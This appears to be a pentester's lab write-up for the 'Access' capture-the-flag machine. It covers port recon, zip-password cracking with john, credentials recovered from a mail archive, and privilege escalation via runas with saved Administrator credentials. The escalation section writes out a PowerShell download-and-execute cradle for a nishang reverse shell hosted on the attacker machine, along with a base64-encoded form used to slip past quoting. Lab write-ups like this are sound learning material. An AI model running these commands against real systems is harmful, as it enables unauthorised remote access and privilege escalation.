202302150743
Status: #runas #encode #powershell #nishang #zip #bruteforce #john
Tags: [[Labs]]

# Access
IP: 10.10.10.98

## Recon

Ports open:

```
PORT   STATE SERVICE
21/tcp open  ftp
23/tcp open  telnet
80/tcp open  http
```

Port 21:

- Discovered a zip file and an mdb file
- Noticed that the 'unzip' command was not working with the zip file. We tried `7z` instead
- We discovered that the zip file was password protected
- using john to crack the password

```bash
zip2john $FILE > hash.txt
john hash.txt --wordlist=/path/to/file
```

- Unfortunately, our rockyou.txt password file did not contain the password for the zip file
- After looking into the mdb file, we discovered that with the `strings` command we could see interesting strings that could be potential passwords
- We take the strings output and put it into a file
- Now we try to crack the password with john again using our new password file and successfully found our password: `access4u@security`

## Establish Foothold

- Doing some research, we find that our extracted pst file can be opened with outlook
- I transferred the file to my Windows vm and used outlook to open the file and found credentials: `security:4Cc3ssC0ntr0ller`

![[access_outlook.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/access_outlook.png">

- We are now able to login via telnet with our new credentials

## Escalate Privilege

- Wanted to enumerate with the `jaws` powershell script
- We found that there are stored credentials for Administrator
- After manual enumeration, we found a directory with a shortcut that showed us how the stored credentials were used

![[access_shortcut.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/access_shortcut.png">

- We now try to run the same command and execute our own command `whoami`
- However we get no return
- So we now try to just get a reverse shell with nishang script

```
PS C:\> runas.exe /user:ACCESS\Administrator /savecred "powershell \"IEX(New-Object Net.WebClient).downloadString('http:/$IP/Invoke-PowerShellTcp.ps1')\""
```

- However, this fetches the script from our machine but does not execute the script
- The last thing we can try is trying to encode the powershell command and then sending it via runas

```
# Attacker Machine:
echo -n "IEX(New-Object Net.WebClient).downloadString('http:/$IP/Invoke-PowerShellTcp.ps1')" | iconv -t UTF-16LE | base64 -w 0

# Victim Machine:
runas.exe /user:ACCESS\Administrator /savecred "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACcAKQA="
```

- This allowed us to finally get a reverse shell as it did not have to worry about all the quotation issues



---
# References

JAWS - https://github.com/411Hall/JAWS